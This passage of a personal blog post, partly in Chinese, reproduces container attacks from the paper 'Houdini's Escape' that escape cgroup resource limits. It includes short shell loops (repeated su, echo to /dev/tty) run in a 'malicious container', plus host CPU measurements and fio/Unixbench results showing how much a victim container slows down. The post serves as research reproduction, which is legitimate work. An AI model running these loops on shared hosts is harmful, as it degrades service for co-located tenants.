stdev=124.97, samples=117</span><br><span class="line">   </span><br><span class="line">root@2b6136c7c609:/# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=write -bs=4k -size=10M -numjobs=16 -runtime=30 -group_reporting</span><br><span class="line">   bw (  KiB/s): min= 4368, max=22178, per=100.00%, avg=15815.60, stdev=314.15, samples=320</span><br><span class="line">   iops        : min= 1092, max= 5544, avg=3953.65, stdev=78.54, samples=320</span><br><span class="line">   </span><br><span class="line">root@2b6136c7c609:/# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=randread -bs=4k -size=10M -numjobs=16 -runtime=30 -group_reporting</span><br><span class="line">   bw (  KiB/s): min=  390, max= 3534, per=100.00%, avg=1687.47, stdev=42.64, samples=958</span><br><span class="line">   iops        : min=   96, max=  882, avg=421.07, stdev=10.66, samples=958</span><br><span class="line">   </span><br><span class="line">root@2b6136c7c609:/# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=randwrite -bs=4k -size=10M -numjobs=16 -runtime=30 -group_reporting</span><br><span class="line">   bw (  KiB/s): min=  166, max= 2080, per=99.95%, avg=1230.35, stdev=23.00, samples=960</span><br><span class="line">   iops        : min=   40, max=  520, avg=306.95, stdev= 5.76, samples=960</span><br></pre></td></tr></table></figure>
+
+<p><strong>attack</strong></p>
+<p>malicious container</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"5"</span> -v /home/zty/dev/cfile:/cfile -it --rm ubuntu</span></span><br><span class="line">root@8ebbb7f63f8e:/# useradd james</span><br><span class="line">root@8ebbb7f63f8e:/# cat /cfile/su-user.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">  exit | su james</span><br><span class="line">done</span><br><span class="line">root@8ebbb7f63f8e:/# /cfile/su-user.sh</span><br></pre></td></tr></table></figure>
+
+<p>victim container - as benchmark like above</p>
+<p>-------------- this is out of date</p>
+<p><strong>su operation in container cannot trigger journald in the Host</strong></p>
+<p>文中提及的操作并不能调用 Host 的 jounald 操作，因此不能 exploit</p>
+<p>下文是在 malicious container 循环 su/exit 操作时，在 host 上查看的 journald cpu 使用情况</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -ax | grep jour</span></span><br><span class="line">  396 ?        S&lt;s    0:16 /lib/systemd/systemd-journald</span><br><span class="line"><span class="meta">$</span><span class="bash"> top -p 396</span></span><br><span class="line">top - 14:04:44 up 22:26,  1 user,  load average: 1.85, 2.23, 1.94</span><br><span class="line">Tasks:   1 total,   0 running,   1 sleeping,   0 stopped,   0 zombie</span><br><span class="line"><span class="meta">%</span><span class="bash">Cpu(s):  3.4 us,  5.1 sy,  0.0 ni, 89.8 id,  0.0 wa,  0.0 hi,  1.6 si,  0.0 st</span></span><br><span class="line">KiB Mem : 16212392 total,  9236540 free,  3412200 used,  3563652 buff/cache</span><br><span class="line">KiB Swap:  2097148 total,  1858556 free,   238592 used. 12361432 avail Mem </span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                  </span><br><span class="line">  396 root      19  -1  175656  78124  70184 S   0.0  0.5   0:16.16 systemd-journal</span><br></pre></td></tr></table></figure>
+
+<p>---------------- 2019.11.12</p>
+<p>After receiving the email of the author, I realize that I don&#39;t have installed an important application called <code>auditd</code>.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install auditd</span></span><br></pre></td></tr></table></figure>
+
+<p>Do above command to install  <code>auditd</code>, then you will observe the utilization increase of <code>journald</code>, <code>auditd</code> and <code>kaouditd</code> after keeping changing user inside the container.</p>
+<h4 id="result"><a href="#result" class="headerlink" title="result"></a>result</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo iotop -oP</span></span><br></pre></td></tr></table></figure>
+
+<p>This command can observe the processes which are doing I/O operations. More info please consider <code>man iotop</code>.</p>
+<p>Unixbench </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System Benchmarks Partial Index              BASELINE       RESULT    INDEX</span><br><span class="line">Execl Throughput                                 43.0       6063.9   1410.2</span><br><span class="line">File Copy 4096 bufsize 8000 maxblocks          5800.0    2317441.3   3995.6</span><br><span class="line">Process Creation                                126.0      14555.2   1155.2</span><br><span class="line">Shell Scripts (1 concurrent)                     42.4      12276.8   2895.5</span><br></pre></td></tr></table></figure>
+
+<p><strong>fio benchmark</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>bw average</th>
+<th>iops average</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Read</td>
+<td>6642.58/40570.14</td>
+<td>1659.94/10142.25</td>
+</tr>
+<tr>
+<td>Write</td>
+<td>943.68/15815.60</td>
+<td>235.38/3953.65</td>
+</tr>
+<tr>
+<td>Rand_read</td>
+<td>1067.48/1687.47</td>
+<td>266.28/421.07</td>
+</tr>
+<tr>
+<td>Rand_write</td>
+<td>666.47/1230.35</td>
+<td>166.04/306.95</td>
+</tr>
+</tbody></table>
+<div id="container-case3" style="weight:100%; height: 600px"></div>
+<script type="text/javascript">
+var dom = document.getElementById("container-case3");
+var myChart = echarts.init(dom);
+var app = {};
+option = {
+    title: {
+        text: 'performance degradation',
+        subtext: '占 baseline 数据的比例'
+    },
+    tooltip: {
+        trigger: 'axis',
+        axisPointer: {
+            type: 'shadow'
+        }
+    },
+    grid: {
+        left: '3%',
+        right: '4%',
+        bottom: '3%',
+        containLabel: true
+    },
+    xAxis: {
+        type: 'value',
+        boundaryGap: [0, 0.01]
+    },
+    yAxis: {
+        type: 'category',
+        data: ['seq_read', 'seq_write', 'rand_read', 'rand_write', 'shell script', 'excel throughput', 'file copy', 'process creation']
+    },
+    series: [
+        {
+            color: '#2f4554',
+            label: {
+                show: 'true',
+                position: 'right',
+                fontSize: '14'
+            },
+            barWidth: '35',
+            type: 'bar',
+            data: [16.37, 5.96, 63.25, 54.16, 91.18, 91.95, 88.13, 93.78]
+        }
+    ]
+};
+;
+if (option && typeof option === "object") {
+    myChart.setOption(option, true);
+}
+</script>
+
+
+
+<h3 id="Case-4-Container-Engine"><a href="#Case-4-Container-Engine" class="headerlink" title="Case 4: Container Engine"></a>Case 4: Container Engine</h3><blockquote>
+<p>It is fairly easy to exploit the container engine to break thecontrol of cgroups. One simple approach is to exploit the terminal subsystem. </p>
+<p>When a container user interacts with the tty device, the data first passes through the CLI process and the container daemon,and reaches the tty driver for further processing. Specifically, the data is sent to the LDISC, which connects the high-level generic interface (e.g., read, write, ioctl) and low-level device driver in the terminal system. The data is flushed to LDISC by executing workqueues in the kworker kernel threads. </p>
+<p>As a result, all workloads onthe kernel threads and all container engine processes will not becharged to the container instances.</p>
+</blockquote>
+<p>简而言之，在 container 内部往 /dev/tty 输入信息，这些信息就会从 container 传递到 container daemon 然后增加 docker，dockerd 还有 kworker 等一系列的进程/线程的工作量。</p>
+<p>那么只要<strong>循环的在 container 内部向 /dev/tty 传递信息</strong>，就会持续 generate wordloads 到 Host 上的一系列进程当中。</p>
+<p>这里<span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81Y2YyNTFkNzUxODgyNTY2ZDkyNjliYjM=" title="https://juejin.im/post/5cf251d751882566d9269bb3">介绍几个命令<i class="fa fa-external-link"></i></span></p>
+<ul>
+<li><code>systemd-cgls</code> 查看 cgroup 信息，返回系统的整体 cgroup 层级</li>
+<li><code>systemd-cgtop</code> 查看 cgroup 层级的动态信息，只显示开启资源统计功能的 sevice 和 slice，可以手动添加新的</li>
+</ul>
+<p>在论文中看到监控资源占用的一共有这几个部分</p>
+<ul>
+<li>container</li>
+<li>docker</li>
+<li>dockerd</li>
+<li>child processes</li>
+<li>dockerd</li>
+<li>rest</li>
+</ul>
+<p>我在 Host 上查找了相关的 processes( with the container already running)，找到以下几个</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -ax | grep <span class="string">"docker\|container"</span></span></span><br><span class="line"> 1535 ?        Ssl    0:16 /usr/bin/containerd</span><br><span class="line"> 1755 ?        Ssl   12:31 /usr/bin/dockerd</span><br><span class="line">26519 pts/0    Sl+    1:33 docker</span><br><span class="line">26545 ?        Sl     3:06 containerd-shim</span><br></pre></td></tr></table></figure>
+
+<p>@@ <strong>containerd-shim 就是运行的容器</strong> @@</p>
+<p>上面这句话是错误的，参见<span class="exturl" data-url="aHR0cDovL2FsZXhhbmRlci5ob2xicmVpY2gub3JnL2RvY2tlci1jb21wb25lbnRzLWV4cGxhaW5lZC8=" title="http://alexander.holbreich.org/docker-components-explained/">这个网站<i class="fa fa-external-link"></i></span>，<strong>containerd-shim 是由 containerd 创建的服务 container 的进程</strong>，一个 container 对应一个 containers-shim。</p>
+<p>而论文当中指的 child processes 不知道具体指什么，另外在 container 执行以下脚本之后</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /cfile/exploit.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	echo aaa &gt; /dev/tty</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>Host 上的 top 结果如下所示（只节选了需要参考的数据和属性列）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  PID USER        %CPU   %MEM     TIME+ COMMAND</span><br><span class="line"> 1475 root        161.5   0.6   2:45.41 dockerd                             </span><br><span class="line">18404 root        111.0   0.0   0:09.90 containerd-shim                     </span><br><span class="line">18529 root        99.7    0.0   0:08.89 exploit.sh                          </span><br><span class="line">18374 zty         54.5    0.4   0:04.86 docker                              </span><br><span class="line">17507 zty         40.5    0.0   0:03.97 sshd                                </span><br><span class="line">17399 root        11.0    0.0   0:01.00 kworker/u24:1-e                     </span><br><span class="line">17823 root        10.6    0.0   0:00.50 kworker/u24:2-e                     </span><br><span class="line">12171 root        10.0    0.0   0:02.70 kworker/u24:0+e                     </span><br><span class="line">18516 zty         1.0     0.3   0:00.11 chrome                              </span><br><span class="line"> 3270 zty         0.7     1.6  11:19.42 gnome-shell                         </span><br><span class="line">    9 root        0.3     0.0   0:00.20 ksoftirqd/0                         </span><br><span class="line">13879 root        0.3     0.0   0:01.57 kworker/u24:4-e                     </span><br><span class="line">    1 root        0.0     0.1   0:05.53 systemd</span><br></pre></td></tr></table></figure>
+
+<p>docker stats 的结果如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME                CPU %               PIDS</span><br><span class="line">nice_goldberg       104.57%             2</span><br></pre></td></tr></table></figure>
+
+<p>dockerd 的 cpu 占用和论文中 dockerd + child process 的 cpu 占用差不多，具体论文中是如何区分 dockerd 和它的 child process 的，我并不知道，而且根据论文中所述</p>
+<blockquote>
+<p>The dockerd process has multiple child processes foreach container instance. Those processes are attached to the defaultcgroupfor all system services.</p>
+</blockquote>
+<p>但我用 <code>pgrep -P {dockerd pid}</code> 时并没有找到相应的 child process，不知是否是作者的理解出问题还是我没有找到。</p>
+<h4 id="Graph-3"><a href="#Graph-3" class="headerlink" title="Graph"></a>Graph</h4><p>最后我总结数据为如下图表所示</p>
+<div id="container5" style="weight:100%; height: 600px"></div>
+<script type="text/javascript">
+var dom = document.getElementById("container5");
+var myChart = echarts.init(dom);
+var app = {};
+option = null;
+option = {
+    tooltip: {
+        trigger: 'item',
+        formatter: "{a} <br/>{b}: {c}%"
+    },
+    legend: {
+        orient: 'vertical',
+        x: 'left',
+        data:['docker','container','dockerd','kworker','containerd-shim']
+    },
+    series: [
+        {
+            name:'process on host',
+            type:'pie',
+            radius: ['40%', '80%'],
+            avoidLabelOverlap: false,
+            label: {
+                show: true,
+                position: 'inside',
+                color: '#fff',
+                fontSize: 18,
+                fontWeight: 'bolder',
+                formatter: '{c}%',
+            },
+            data:[
+                {value:54.5, name:'docker'},
+                {value:104.57, name:'container'},
+                {value:161.5, name:'dockerd'},
+                {value:31.6, name:'kworker'},
+                {value:111.0, name:'containerd-shim'}
+            ],
+            itemStyle: {
+                emphasis: {
+                    shadowBlur: 10,
+                    shadowOffsetX: 0,
+                    shadowColor: 'rgba(0, 0, 0, 0.5)'
+                }
+            }
+        }
+    ],
+    graphic: {
+        type: 'text',
+        z: 100,
+        left: 'center',
+        top: 'middle',
+        style: {
+            fill: '#333',
+            text: [
+                'Total:',
+                ' ',
+                '463.17%'
+            ].join('\n'),
+            fontWeight: 'bolder',
+            fontSize: 26
+        }
+    }
+};
+;
+if (option && typeof option === "object") {
+    myChart.setOption(option, true);
+}
+</script>
+
+<h3 id="Case-5-Softirq-Handling"><a href="#Case-5-Softirq-Handling" class="headerlink" title="Case 5:  Softirq Handling"></a>Case 5:  Softirq Handling</h3><p>这个 case 主要针对的是 <em>softirqd</em> 和 <em>interrupt context</em>，分别利用 NET softirq 和 BLOCK softirq 来 generate workloads 到 Host 上去。</p>
+<p>从文章的分析上看，NET softirq 手段在 Local testbed 上表现还可以，在 iptable rules 达到 10w 的时候，最多可以消耗 Host 50% 的 cpu 资源，然而由于目前缺乏关于 iptable rules 的相关知识，同时也没法按照实验里说的那样制造大量的 network traffic，因为 paper 对这个 case 的描述不多。</p>
+<p>因此在这里只尝试 BLOCK softirq 的攻击手段，对于前者，我建立了一个 github issue，留待今后有需要的时候更新，有兴趣的同学也可以尝试。</p>
+<h4 id="BLOCK-softirq"><a href="#BLOCK-softirq" class="headerlink" title="BLOCK softirq"></a>BLOCK softirq</h4><p>先准备新的 image，这次需要 sysbench 和 fio 两个 benchmark tool，因此过程如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat Dockerfile </span></span><br><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Tianyu &lt;lufeihaizei2008@gmail.com&gt;</span><br><span class="line">COPY ./apt /apt-info</span><br><span class="line">RUN cp /apt-info/sources.list /etc/apt/</span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN yes | apt-get install sysbench make gcc</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -t tianyu/ubuntu</span></span><br><span class="line">tianyu/ubuntu       tianyu/ubuntu:v1    tianyu/ubuntu:v2    tianyu/ubuntu:v2.1</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -t tianyu/ubuntu:v5 .</span></span><br></pre></td></tr></table></figure>
+
+<p>然后启动 container 做一些初始化工作，注意需要限制在一个 cpu core 上</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/fio:/fio --rm -it tianyu/ubuntu:v5</span></span><br><span class="line">root@cfe09f72208c:/# cd /fio</span><br><span class="line">root@cfe09f72208c:/fio# ./configure</span><br><span class="line">root@cfe09f72208c:/fio# make</span><br><span class="line">root@cfe09f72208c:/fio# make install</span><br><span class="line">root@cfe09f72208c:/fio# fio --version</span><br><span class="line">fio-3.16</span><br><span class="line">root@cfe09f72208c:/fio# sysbench --version</span><br><span class="line">sysbench 1.0.11</span><br><span class="line">root@cfe09f72208c:/fio# fio -directory=/data/ -ioengine=sync -name=tempfile.dat -direct=1 -rw=read -bs=4k -size=10M -numjobs=16 -runtime=100 -group_reporting</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[^note1]:  cgroup man page: <span class="exturl" data-url="aHR0cDovL21hbjcub3JnL2xpbnV4L21hbi1wYWdlcy9tYW43L2Nncm91cHMuNy5odG1s" title="http://man7.org/linux/man-pages/man7/cgroups.7.html">http://man7.org/linux/man-pages/man7/cgroups.7.html<i class="fa fa-external-link"></i></span>.</p>
+<p>[^note2]: Gao, Xing, et al. &quot;Houdini’s Escape: Breaking the Resource Rein of Linux Control Groups.&quot; (2019).<br>[^note3]: The 26th ACM Conference on Computer and Communications Security in <strong>London, United Kingdom from November 11 to November 15, 2019</strong>.</p>
+<p>[^note4]: Docker installation and configuration: <a href="https://tianyuzhou.top/wiki/docker-install/">https://tianyuzhou.top/wiki/docker-install/</a>.<br>[^note5]:Docker official Documentation of docker run command:  <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3JlZmVyZW5jZS9jb21tYW5kbGluZS9ydW4v" title="https://docs.docker.com/engine/reference/commandline/run/">https://docs.docker.com/engine/reference/commandline/run/<i class="fa fa-external-link"></i></span>.<br>[^note6]: Docker container cpu period constaint: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3JlZmVyZW5jZS9ydW4vI2NwdS1wZXJpb2QtY29uc3RyYWludA==" title="https://docs.docker.com/engine/reference/run/#cpu-period-constraint">https://docs.docker.com/engine/reference/run/#cpu-period-constraint<i class="fa fa-external-link"></i></span>.</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/cgroup/" rel="tag"># cgroup</a>
+              <a href="/tags/Docker/" rel="tag"># Docker</a>
+              <a href="/tags/Linux-container/" rel="tag"># Linux container</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/10/16/x86-inline-assemble/" rel="prev" title="x86 inline assemble Core dumped in Linux-5.0">
+      <i class="fa fa-chevron-left"></i> x86 inline assemble Core dumped in Linux-5.0
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/10/21/fork-in-c/" rel="next" title="Totally Delete Child Process">
+      Totally Delete Child Process <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Introduction"><span class="nav-number">1.</span> <span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cgroups-Hierarchy-and-Controllers"><span class="nav-number">2.</span> <span class="nav-text">Cgroups Hierarchy and Controllers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cgroups-Inheritance"><span class="nav-number">3.</span> <span class="nav-text">Cgroups Inheritance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploiting-Strategies"><span class="nav-number">4.</span> <span class="nav-text">Exploiting Strategies</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cases-Reccurent"><span class="nav-number">5.</span> <span class="nav-text">Cases Reccurent</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Case-1-Exception-Handling"><span class="nav-number">5.1.</span> <span class="nav-text">Case 1: Exception Handling</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Graph-for-cpu-utilization"><span class="nav-number">5.1.1.</span> <span class="nav-text">Graph for cpu utilization</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DoS-Attack"><span class="nav-number">5.1.2.</span> <span class="nav-text">DoS Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Graph"><span class="nav-number">5.1.2.1.</span> <span class="nav-text">Graph</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Case-2-Data-Synchronization"><span class="nav-number">5.2.</span> <span class="nav-text">Case 2: Data Synchronization</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#I-O-Based-DOS-Attack"><span class="nav-number">5.2.1.</span> <span class="nav-text">I&#x2F;O Based DOS Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Graph-1"><span class="nav-number">5.2.1.1.</span> <span class="nav-text">Graph</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Resource-Freeing-Attack"><span class="nav-number">5.2.2.</span> <span class="nav-text">Resource-Freeing Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Graph-2"><span class="nav-number">5.2.2.1.</span> <span class="nav-text">Graph</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Case-3-System-Process-Journald"><span class="nav-number">5.3.</span> <span class="nav-text">Case 3: System Process - Journald</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#data-clloect"><span class="nav-number">5.3.1.</span> <span class="nav-text">data clloect</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#result"><span class="nav-number">5.3.2.</span> <span class="nav-text">result</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Case-4-Container-Engine"><span class="nav-number">5.4.</span> <span class="nav-text">Case 4: Container Engine</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Graph-3"><span class="nav-number">5.4.1.</span> <span class="nav-text">Graph</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Case-5-Softirq-Handling"><span class="nav-number">5.5.</span> <span class="nav-text">Case 5:  Softirq Handling</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BLOCK-softirq"><span class="nav-number">5.5.1.</span> <span class="nav-text">BLOCK softirq</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#References"><span class="nav-number">6.</span> <span class="nav-text">References</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tianyu Zhou"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Tianyu Zhou</p>
+  <div class="site-description" itemprop="description">a personal site of Tianyu</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Albert Zhou</span>
+</div>
+  <div class="theme-info">Theme – <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZw==">NexT.Gemini</span> v7.7.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
